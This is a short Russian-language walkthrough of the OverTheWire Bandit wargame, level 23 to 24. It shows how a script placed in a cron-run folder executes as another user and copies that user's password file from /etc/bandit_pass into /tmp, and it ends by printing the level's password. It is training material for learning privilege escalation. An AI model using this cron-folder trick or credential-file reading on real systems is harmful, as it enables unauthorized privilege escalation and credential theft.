markdown
# Bandit Уровень 23 → 24

## Задача
Использовать cron-задачу, которая выполняет все скрипты в `/var/spool/bandit24/foo/` с правами пользователя `bandit24`.

## Что я сделал
1. Находился на уровне `bandit23`
2. Изучил скрипт `/usr/bin/cronjob_bandit24.sh`, который:
   - Переходит в `/var/spool/bandit24/foo/`
   - Запускает все скрипты от имени `bandit24`
   - Удаляет их после выполнения
3. Создал свой скрипт, который читает пароль и сохраняет его в `/tmp/`:
   ```bash
   echo '#!/bin/bash' > /tmp/getpass.sh
   echo 'cat /etc/bandit_pass/bandit24 > /tmp/bandit24_password.txt' >> /tmp/getpass.sh
   chmod +x /tmp/getpass.sh
Скопировал скрипт в папку cron:

bash
cp /tmp/getpass.sh /var/spool/bandit24/foo/
Через минуту прочитал результат:

bash
cat /tmp/bandit24_password.txt
Команды, которые изучил
cron — автоматическое выполнение задач

/var/spool/ — папка для задач на выполнение

Создание скриптов для автоматического получения паролей

Пароль для следующего уровня (bandit24)
gb8KRRCsshuZXI0tUuR6ypOFjizBf3G8
